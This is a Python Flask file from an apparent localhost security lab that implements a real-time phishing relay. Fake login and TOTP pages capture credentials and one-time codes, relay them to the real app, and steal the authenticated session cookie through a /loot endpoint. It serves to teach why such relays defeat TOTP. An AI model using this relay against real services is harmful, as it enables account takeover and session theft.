"""
ATTACK 5 — REAL-TIME PHISHING RELAY  (Adversary-in-the-Middle / AiTM)
LOCALHOST LAB DEMONSTRATION ONLY

This is a teaching artifact. It runs entirely on localhost and relays to YOUR
OWN vulnerable app. It demonstrates ONE thing: why a real-time relay defeats
TOTP even when TOTP is implemented perfectly.

It is deliberately NOT a deployable phishing tool:
  - no domain spoofing, no DNS/hosts manipulation, no TLS cert tricks
  - no lure/email/SMS templates, no victim-targeting logic
  - relays only to 127.0.0.1, hardcoded

The point: the victim types a VALID, FRESH TOTP code into the proxy. The proxy
relays it to the real app in real time. The code passes every check (correct,
not expired, used once). The attacker captures the resulting authenticated
session. No rate limit, replay guard, tight window, or encrypted secret stops
this — because the human handed a valid credential to the wrong party.

Architecture:
    victim  ->  PROXY (port 5003)  ->  REAL APP (port 5002)
                     |
                     +-- captures: username, password, TOTP code, and the
                         REAL authenticated session cookie

Run order:
    1. start vulnerable/app.py        (real app, port 5002)
    2. start this proxy               (port 5003)
    3. run victim_simulator.py        (plays the tricked user)
"""

from flask import Flask, request, render_template_string, make_response
import requests
import uuid

app = Flask(__name__)

REAL_APP = "http://127.0.0.1:5002"   # hardcoded localhost target (your own app)

# Per-victim relay sessions: the proxy holds a live requests.Session to the
# real app for each victim, so the cookie set at the password step carries
# through to the TOTP step.
relay_sessions = {}

# The attacker's loot.
captured = []


PHISH_LOGIN = """
<!DOCTYPE html><html><body style="font-family:sans-serif;max-width:380px;margin:60px auto">
<h2>Step 1 — Password</h2>
<!-- Looks identical to the real app. In a real AiTM the victim sees the real
     page's content, often proxied verbatim. -->
<form method="post" action="/login">
  <input name="username" placeholder="username" style="width:100%;padding:8px;margin:6px 0"><br>
  <input type="password" name="password" placeholder="password" style="width:100%;padding:8px;margin:6px 0"><br>
  <button style="padding:8px 20px">Continue</button>
</form>
</body></html>
"""

PHISH_TOTP = """
<!DOCTYPE html><html><body style="font-family:sans-serif;max-width:380px;margin:60px auto">
<h2>Step 2 — Enter 6-digit code</h2>
<form method="post" action="/verify-totp">
  <input name="code" placeholder="000000" style="width:100%;padding:8px;margin:6px 0"><br>
  <button style="padding:8px 20px">Verify</button>
</form>
</body></html>
"""

PHISH_DONE = """
<!DOCTYPE html><html><body style="font-family:sans-serif;max-width:380px;margin:60px auto">
<h2>Welcome</h2>
<p>You are logged in.</p>
<!-- Victim sees a success page and suspects nothing. The attacker now holds
     a valid authenticated session to the real app. -->
</body></html>
"""


def _vid():
    """Get or create this visitor's relay id (stored in a proxy cookie)."""
    vid = request.cookies.get("vid")
    if not vid or vid not in relay_sessions:
        vid = uuid.uuid4().hex
        relay_sessions[vid] = requests.Session()
    return vid


@app.route("/", methods=["GET"])
def index():
    vid = _vid()
    resp = make_response(render_template_string(PHISH_LOGIN))
    resp.set_cookie("vid", vid)
    return resp


@app.route("/login", methods=["POST"])
def login():
    vid = _vid()
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    # CAPTURE the credentials
    print(f"\n[CAPTURED] username = {username!r}")
    print(f"[CAPTURED] password = {password!r}")
    captured.append(("password", username, password))

    # RELAY to the real app in real time, using the per-victim session
    sess = relay_sessions[vid]
    sess.post(f"{REAL_APP}/login", data={"username": username, "password": password})
    print(f"[RELAY] forwarded password to real app; now holding its session cookie")

    # Show the victim the next step (TOTP), exactly like the real app would
    resp = make_response(render_template_string(PHISH_TOTP))
    resp.set_cookie("vid", vid)
    return resp


@app.route("/verify-totp", methods=["POST"])
def verify_totp():
    vid = _vid()
    code = request.form.get("code", "")

    # CAPTURE the live TOTP code
    print(f"[CAPTURED] TOTP code = {code!r}  <-- valid, fresh, single-use")
    captured.append(("totp", code))

    # RELAY the code to the real app IMMEDIATELY (within its 30s validity)
    sess = relay_sessions[vid]
    r = sess.post(f"{REAL_APP}/verify-totp", data={"code": code})

    if "Dashboard" in r.text:
        # The relay session is now AUTHENTICATED. Steal the session cookie.
        stolen = sess.cookies.get_dict()
        print(f"[+++] RELAY SUCCEEDED — captured authenticated session:")
        print(f"      {stolen}")
        print(f"[+++] Attacker can now use this cookie to access the real app as {captured[0][1]!r}")
        captured.append(("session", stolen))
    else:
        print(f"[---] relay did not reach dashboard")

    resp = make_response(render_template_string(PHISH_DONE))
    resp.set_cookie("vid", vid)
    return resp


@app.route("/loot", methods=["GET"])
def loot():
    """Attacker's view of everything captured this run."""
    return {"captured": [list(map(str, c)) for c in captured]}


if __name__ == "__main__":
    print("=" * 60)
    print("AiTM RELAY PROXY (lab demo) — listening on port 5003")
    print(f"Relaying to real app at {REAL_APP}")
    print("This is a localhost teaching artifact, not a deployable tool.")
    print("=" * 60)
    app.run(debug=False, host="127.0.0.1", port=5003)
